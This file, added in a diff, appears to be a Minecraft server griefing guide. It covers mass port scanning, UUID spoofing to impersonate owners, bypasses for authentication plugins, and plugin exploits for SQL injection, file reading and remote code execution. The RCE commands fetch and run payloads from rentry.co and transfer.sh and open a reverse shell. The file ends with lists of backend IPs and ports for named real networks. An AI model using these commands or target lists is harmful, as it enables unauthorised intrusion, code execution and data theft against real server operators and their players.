@@ -1,0 +1,247 @@
+To grief, we scan the internet for open minecraft server ports
+Many tools are available to use it, most common for minecraft is quboscanner or masscan
+I recommend using a VPS to scan since scanning on your pc is going to end up badly. (Websites going to block you, isp can contact you (police might contact you too), shit results from the scanning)
+Learn about networking here: https://www.cloudflare.com/learning/
+
+UUID Spoofing tutorial:
+1. Use a client with UUID Spoofing
+2. Find a ip-forwarding server by scanning or any other method
+2. Find the owner's nickname.
+3. If the server is Premium (bungeecord is premium): Toggle premium uuid and set your fake nick to the owners nick, For cracked server do the same but make sure premium uuid is set to No.
+4. Click spoof.
+5. Join the server with bungeehack on it
+6. Done
+If it doesnt work it means the server is using a custom uuid system. I Know alot russian servers do that, also another one that is using a custom uuid system is brodaci.net and ticocraft.com.
+
+Bypasses:
+
+You can bypass onlyproxyjoin by setting your ip to 0.0.0.0
+You can sometimes bypass SecuredNetwork by just spam joining. (New version called SafeNET is not bypassable)
+You can bypass UUIDSpoof - Fix by setting your name to zPirroZ3007 and your fake uuid to your desired uuid.
+You can bypass BungeeGuard on older versions is by using RBungeeExploit (by wrrulos) (https://github.com/wrrulos/RBungeeExploit) and use /connect [IP]. This exploit rarely works on any other spigot version than 1.8.8. 
+There are no IP-Whitelist bypasses and all of them are scams.
+Sometimes You can bypass PIN | 2FA Sytems by spoofing your nickname to yours and uuid to the owners one. You can also try bypassing by typing 0000, 1234, 4321, etc or just *
+
+Dumping methods:
+
+Litebans - Any version under 2.3.10 is vulnerable to sql injection, use /litebans sqlexec
+PlaceholderAPI - Javascript expansion with version before 2.1.0 is vulnerable to RCE made by me, heres how to use it: 
+/jsexp parse me new java.lang.ProcessBuilder("wget", "https://rentry.co/ui3i2/raw").start();
+/jsexp parse me new java.lang.ProcessBuilder("bash", "raw").start();
+Replace https://rentry.co/ui3i2/raw with your own payload link.
+Fun fact: this exploit was the most powerful one in the history!
+HolographicDisplays - Any version under 2.2.7 is vulnerable to LFI, use /hd create a AND /hd readtext ../../LuckPerms/config.yml or any other file
+CommandPanels - Unpatched on every verison, requires a plugin loader such as plugman or the PlaceholderAPI plugin.
+PlaceholderAPI CommandPanels:
+/cpi lmfao.jar https://transfer.sh/get/S3MLec/unnamed.jar
+/papi register ../../CommandPanels/panels/lmfao.jar.yml
+/papi parse me %rce_curl_-O_https://rentry.co/os7q7/raw%
+/papi parse me %rce_bash_raw%
+Replace https://rentry.co/os7q7/raw with your own payload link.
+Plugman CommandPanels:
+/cpi lmfao.jar https://transfer.sh/get/zCONva/SpigotRCE-1.0-SNAPSHOT-shaded.jar
+/plugman load CommandPanels/panels/lmfao.jar.yml
+Now type in chat:
+5170haxor linux yourreverseshellip
+or
+5170haxor windows yourreverseshellip
+WARNING: YOU MUST BIND YOUR REVERSE SHELL TO PORT 9001!
+
+PlugmanX - /plugman download direct RCELINKPLUGIN
+
+How to scan: 
+
+For Qubo:
+
+Semi ip-ranges ranges (/24 etc)
+Put this to scan file with no extension so just scan
+
+java -Dfile.encoding=UTF-8 -jar qubo.jar -ports 10000-10010,20000-20010,30000-30010,40000-40010,22222,11111,33333,44444,55555,65535,25500-25599,25600-25699 -th 8000 -ti 1250 -c 1 -noping -range $1
+
+Big ip-ranges (/16 etc)
+Put this to scanbig file with no extension so just scanbig
+
+java -Dfile.encoding=UTF-8 -jar qubo.jar -ports 10000-10010,20000-20010,30000-30010,40000-40010,22222,11111,33333,44444,55555,65535,25500-25599,25600-25699 -th 8000 -ti 1250 -c 1 -noping -range $1
+
+For Masscan:
+Put this to scanmasscan file with no extension so just scanmasscan
+
+masscan --wait 0 -p 1000-1010,2000-2010,3000-3010,4000-4010,5000-5010,6000-6010,7000-7010,8000-8010,9000-9010,10000-10010,10100-10110,11000-11010,12000-12010,13000-13010,14000-14010,15000-15010,16000-16010,17000-17010,18000-18010,19000-19010,20000-20010,20100-20110,21000-21010,22000-22010,23000-23010,24000-24010,25000-25010,26000-26010,27000-27010,28000-28010,29000-29010,30000-30010,30100-30110,31000-31010,32000-32010,33000-33010,34000-34010,35000-35010,36000-36010,37000-37010,38000-38010,39000-39010,40000-40010,41000-41010,42000-42010,43000-43010,44000-44010,45000-45010,46000-46010,47000-47010,48000-48010,49000-49010,50000-50010,51000-51010,52000-52010,53000-53010,54000-54010,55000-55010,56000-56010,57000-57010,58000-58010,59000-59010,60000-60010,61000-61010,62000-62010,63000-63010,64000-64010,65000-65010,11111,12345,12346,0-20,100-110,200-205,212,300-305,400-405,500-505,600-605,666,700-705,777,800-805,900-905,6666,7777,13370,13377,13337,23456,23467,23457,27777,27017,6379,65535,123,321,4321,54321,4321,321,5432,25100-25110,3535,35350,2137,2115,21115,25550-25600 --max-rate 70000 -oL outputmasscan.txt $1
+
+How to scan whole asn scan at once:
+
+apt-get install whois
+
+First this
+put ASN in asn.txt
+Add this to ranger.sh file into a linux system, use wsl if you use windows
+
+while read asn; do
+        whois -h whois.radb.net -- "-i origin ${1:-$asn}" | grep -Eo "([0-9.]+){4}/[0-9]+" >> ranges.lst
+done < asn.txt
+
+type: sh ranger.sh
+
+Now select qubo or masscan and paste into formatter.sh
+type: sh formatter.sh
+
+FOR QUBO
+
+with open("ranges.lst", "r") as f:
+    for line in f:
+        line = line.strip()
+        print(line)
+        with open("formatted", "a") as f:
+            f.write("./scan " + line + "\n")
+
+FOR MASSCAN
+lines = []
+with open("ranges.lst", "r") as f:
+    for line in f:
+        line = line.strip()
+        lines.append(line)
+        with open("masscanformatted", "a") as f:
+            f.write("./scanmasscan " + ",".join(lines) + "\n")
+
+now type: sh formatted or sh masscanformatted
+DONT FORGET TO REMOVE OLD ranges.lst AND asn.txt AFTER SCANNING!
+
+Some old backends (scan them with 1-65535 port range if you want):
+
+CRAFTED
+(148.251.67.170:22002)(16/100)(Paper 1.12.2)(A Minecraft Server)
+(148.251.67.170:22004)(18/100)(Paper 1.12.2)(A Minecraft Server)
+(148.251.67.170:22003)(14/100)(Paper 1.12.2)(A Minecraft Server)
+(148.251.67.170:22001)(13/100)(Paper 1.12.2)(A Minecraft Server)
+
+CHICKENCRAFT
+(148.251.54.19:9002)(19/200)(Paper 1.16.5)(A Minecraft Server)
+(148.251.54.19:9016)(4/200)(Paper 1.16.5)(A Minecraft Server)
+(148.251.54.19:9012)(80/200)(Paper 1.18.2)(A Minecraft Server)
+(148.251.54.19:9015)(3/999)(Paper 1.16.5)(A Minecraft Server)
+(148.251.54.19:9005)(4/200)(Paper 1.16.5)(A Minecraft Server)
+(148.251.54.19:9003)(76/150)(Pufferfish 1.18.2)(A Minecraft Server)
+(148.251.54.19:9004)(0/200)(Paper 1.16.5)(A Minecraft Server)
+(148.251.54.19:9010)(53/200)(Paper 1.17.1)(A Minecraft Server)
+(148.251.54.19:9006)(0/20)(Paper 1.19)(A Minecraft Server)
+(148.251.54.19:9014)(0/200)(Paper 1.17.1)(A Minecraft Server)
+(148.251.54.19:9018)(35/200)(Purpur 1.16.5)(A Minecraft Server)
+(148.251.54.19:9097)(60/500)(Chickencraft 1.8-1.18)(§kDChickenCraft§kD | #1 PVP Network EARTHSMP ==> OUT NOW.)
+(148.251.54.19:9096)(60/500)(Chickencraft 1.8-1.18)(§kDChickenCraft§kD | #1 PVP Network EARTHSMP ==> OUT NOW.)
+
+TWISTMC
+(209.222.101.3:2001)(0/200)(PaperSpigot 1.8.8)(A Minecraft Server)
+(209.222.101.3:2002)(0/200)(PaperSpigot 1.8.8)(A Minecraft Server)
+(209.222.101.3:2000)(0/200)(PaperSpigot 1.8.8)(A Minecraft Server)
+(209.222.101.3:2003)(0/200)(PaperSpigot 1.8.8)(A Minecraft Server)
+(209.222.101.3:2004)(0/200)(PaperSpigot 1.8.8)(A Minecraft Server)
+
+ARKEMIS
+(162.55.96.254:6002)(0/80)(PaperSpigot 1.8.8)(ONLINE)
+(162.55.96.254:6004)(0/80)(PaperSpigot 1.8.8)()
+(162.55.96.254:6005)(0/80)(PaperSpigot 1.8.8)(ONLINE)
+(162.55.96.254:6003)(0/80)(PaperSpigot 1.8.8)(ONLINE)
+(162.55.96.254:6001)(0/80)(PandaSpigot 1.8.8)(ONLINE)
+(162.55.96.254:6010)(0/500)(TacoSpigot 1.8.8)(ONLINE)
+(162.55.96.254:6012)(0/100)(PaperSpigot 1.8.8)(Event Server Arkemis)
+(162.55.96.254:6099)(0/0)(PaperSpigot 1.8.8)()
+(162.55.96.254:6098)(0/20)(Spigot 1.18.2)(Le HikawiLeKiwi serveur | Arkemis)
+
+ANTIAC
+(168.119.147.58:1002)(0/100)(Spigot 1.8.8)(A Minecraft Server)
+(168.119.147.58:1001)(1/100)(PaperSpigot 1.8.8)(A Minecraft Server)
+
+INVADEDLANDS
+(104.243.42.120:5006)(0/200)(TacoSpigot 1.8.8)(A Minecraft Server)
+
+CASHMC
+(144.76.91.8:25584)(25/99999)(Paper 1.18.2)(A Minecraft Server)
+(144.76.91.8:25595)(94/9999)(Tuinity 1.16.5)()
+
+WIOCHAMC
+(162.55.83.81:25569)(186/250)(Airplane 1.17.1)(A Minecraft Server)
+(162.55.83.81:25598)(0/200)(Paper 1.17.1)(A Minecraft Server)
+(162.55.83.81:25582)(0/150)(Paper 1.17.1)(A Minecraft Server)
+
+PLAYHILLS
+(176.9.184.216:633)(0/20)(PaperSpigot 1.8.8)(A Minecraft Server)
+(176.9.184.216:501)(0/20)(PaperSpigot 1.8.8)(Officialfk's Dev-Server)
+(176.9.184.216:901)(0/200)(PaperSpigot 1.8.8)(WAITING;0)
+(176.9.184.216:900)(3/100)(PaperSpigot 1.8.8)(A Minecraft Server)
+(176.9.184.216:902)(0/0)(PaperSpigot 1.8.8)()
+(176.9.184.216:906)(0/200)(PaperSpigot 1.8.8)(WAITING;0)
+(176.9.184.216:903)(4/100)(PaperSpigot 1.8.8)(A Minecraft Server)
+(176.9.184.216:11186)(0/200)(PaperSpigot 1.8.8)(A Minecraft Server)
+(176.9.184.216:20600)(0/80)(PaperSpigot 1.8.8)(A Minecraft Server)
+
+POKEWILD
+51.81.107.122:50004 >> Version: Paper 1.16.5 || Players: 39/100 || Description: Pokéwild [1.15+]TEST SERVER
+51.222.244.19:50005 >> Version: Paper 1.16.5 || Players: 28/100 || Description: Pokéwild [1.15+]TEST SERVER
+51.222.244.19:50004 >> Version: Paper 1.16.5 || Players: 27/300 || Description: Pokéwild [1.15+]TEST SPAWN SERVER
+
+SUNNYSURVIVAL & WILDWOOD SMP
+51.222.245.202:25565 >> Version: Pufferfish 1.17.1 || Players: 352/250 || Description: Sunny Survival | Come Vibe! A Friendly 1.17.1 Survival Experience
+51.222.245.202:25567 >> Version: Pufferfish 1.18.2 || Players: 77/120 || Description: WILDWOOD SMP [1.18.2] ᴛʜᴇ ʙᴇsᴛ ᴏɴᴇ-sᴛᴏᴘ sᴍᴘ ɴᴇᴛᴡᴏʀᴋ!
+
+CRAZYNETWORK
+(51.79.230.35:23467)(6/90)(CN-Main 1.17.1)()
+(51.79.230.35:23647)(17/80)(CN-Main 1.16.5)()
+(51.79.230.35:25570)(0/100)(CN-Core 1.17.1)()
+(51.79.230.35:25589)(0/30)(Spigot 1.16.5)(A Minecraft Server)
+
+ALONEFIELD
+(51.79.231.93:25568)(8/200)(CarbonSpigot 1.8.8)(A Minecraft Server)
+(51.79.231.93:25601)(0/100)(NachoSpigot 1.8.8)(A Minecraft Server)
+(51.79.231.93:25567)(0/200)(CarbonSpigot 1.8.8)(A Minecraft Server)
+
+ICESWORD
+51.68.230.63:25565 >> Version: TacoSpigot 1.8.8 || Players: 0/20 || Description: ouvert
+
+LIFESTEAL.IO
+(23.88.9.250:25573)(0/1)(Waterfall 1.8.x, 1.9.x, 1.10.x, 1.11.x, 1.12.x, 1.13.x, 1.14.x, 1.15.x, 1.16.x, 1.17.x, 1.18.x, 1.19.x)(Another Bungee server)
+(23.88.9.250:25583)(0/100)(NanoLimbo)(NanoLimbo)
+(23.88.9.250:25566)(28/2000)(AirplanePurpur 1.17.1)(A Minecraft Server)
+(23.88.9.250:25572)(0/100)(Paper 1.17.1)(A Minecraft Server)
+(23.88.9.250:25567)(37/200)(AirplanePurpur 1.17.1)(A Minecraft Server)
+(23.88.9.250:25565)(70/500)(Velocity 1.7.2-1.19)(lifesteal.io | NEW SEASONNormal Lifesteal/OP Lifesteal)
+(23.88.9.250:25580)(100/200)(Flicked 1.17.1)(Flicked Minecraft Server)
+(23.88.9.250:25570)(0/20)(Paper 1.19)(A Minecraft Server)
+(23.88.9.250:25576)(0/35)(Paper 1.17.1)(A Minecraft Server)
+(23.88.9.250:25575)(0/20)(Paper 1.18.2)(A Minecraft Server)
+(23.88.9.250:25571)(0/20)(Paper 1.17.1)(A Minecraft Server)
+(23.88.9.250:25578)(2/150)(FlameCord 1.7.x-1.19.x)(■■■■■■■■■■ Synex Network1.17.1-1.18.1 ■■■■■■■■■■■■■■■■■■■■Your new adventure will begin■■■■■■■■■)
+(23.88.9.250:25577)(93/500)(Purpur 1.18.2)(A Minecraft Server)
+
+MINELATINO
+(209.222.97.218:11003)(16/80)(Tuinity 1.16.5)(survival-1-16-5)
+(209.222.97.218:11005)(0/80)(Tuinity 1.16.5)(survival-1-16-5)
+(209.222.97.218:11004)(2/40)(Paper 1.16.5)(Servidor de defiende la villa)
+(209.222.97.218:10104)(44/120)(PaperSpigot 1.8.8)({"map":"MiniCoastal","state":"INGAME","phase":"IV","teams":[{"translation":"${anni.teams.text.green.nexus}","color":"","health":40},{"translation":"${anni.teams.text.red.nexus}","color":"","health":40},{"translation":"${anni.teams.text.blue.nexus}","color":"","health":40},{"translation":"${anni.teams.text.yellow.nexus}","color":"","health":40}]})
+(209.222.97.218:11002)(4/120)(iSpigot 1.8.8)(A Minecraft Server)
+(209.222.97.218:11011)(0/120)(PaperSpigot 1.8.8)(Servidor de Ataque vs Defensa)
+(209.222.97.218:10103)(0/90)(PaperSpigot 1.8.8)({"map":"unknown","state":"WAITING","playersLeft":"8","teams":[{"translation":"${anni.teams.text.green.nexus}","color":"","health":75},{"translation":"${anni.teams.text.red.nexus}","color":"","health":75},{"translation":"${anni.teams.text.blue.nexus}","color":"","health":75},{"translation":"${anni.teams.text.yellow.nexus}","color":"","health":75}]})
+(209.222.97.218:11050)(1/120)(iSpigot 1.8.8)()
+(209.222.97.218:10003)(0/40)(PaperSpigot 1.8.8)(Castigos)
+(209.222.97.218:10001)(11/500)(PaperSpigot 1.8.8)()
+(209.222.97.218:11001)(0/120)(PaperSpigot 1.8.8)(Servidor de Gappleados)
+(209.222.97.218:10000)(0/60)(PaperSpigot 1.8.8)(&bLogin)
+(209.222.97.218:10012)(2/160)(PaperSpigot 1.8.8)({"map":"unknown","state":"WAITING","playersLeft":"118","teams":[{"translation":"${anni.teams.text.green.nexus}","color":"","health":75},{"translation":"${anni.teams.text.red.nexus}","color":"","health":75},{"translation":"${anni.teams.text.blue.nexus}","color":"","health":75},{"translation":"${anni.teams.text.yellow.nexus}","color":"","health":75}]})
+(209.222.97.218:10011)(0/160)(PaperSpigot 1.8.8)({"map":"unknown","state":"WAITING","playersLeft":"120","teams":[{"translation":"${anni.teams.text.green.nexus}","color":"","health":75},{"translation":"${anni.teams.text.red.nexus}","color":"","health":75},{"translation":"${anni.teams.text.blue.nexus}","color":"","health":75},{"translation":"${anni.teams.text.yellow.nexus}","color":"","health":75}]})
+
+HYCRAFT
+(23.139.82.99:30302)(10/75)(PaperSpigot 1.8.8)(A simple snake spigot server)
+(23.139.82.99:21006)(26/200)(PaperSpigot 1.8.8)(A simple snake spigot server)
+(23.139.82.99:21007)(28/200)(PaperSpigot 1.8.8)(A simple snake spigot server)
+(23.139.82.99:21001)(30/200)(PaperSpigot 1.8.8)(A simple snake spigot server)
+(23.139.82.99:21004)(32/200)(PaperSpigot 1.8.8)(A simple snake spigot server)
+(23.139.82.99:21005)(29/200)(PaperSpigot 1.8.8)(A simple snake spigot server)
+(23.139.82.99:30200)(6/75)(PaperSpigot 1.8.8)(A simple snake spigot server)
+(23.139.82.99:21000)(26/200)(PaperSpigot 1.8.8)(A simple snake spigot server)
+(23.139.82.99:30300)(10/75)(PaperSpigot 1.8.8)(A simple snake spigot server)
+(23.139.82.99:30201)(5/75)(PaperSpigot 1.8.8)(A simple snake spigot server)
+(23.139.82.99:30303)(9/75)(PaperSpigot 1.8.8)(A simple snake spigot server)
+(23.139.82.99:21003)(26/200)(PaperSpigot 1.8.8)(A simple snake spigot server)
+(23.139.82.99:30301)(11/75)(PaperSpigot 1.8.8)(A simple snake spigot server)
+(23.139.82.99:21002)(27/200)(PaperSpigot 1.8.8)(A simple snake spigot server)
+(23.139.82.99:30202)(5/75)(PaperSpigot 1.8.8)(A simple snake spigot server)
+If you want more, contact me on discord: https://discord.isnow.dev
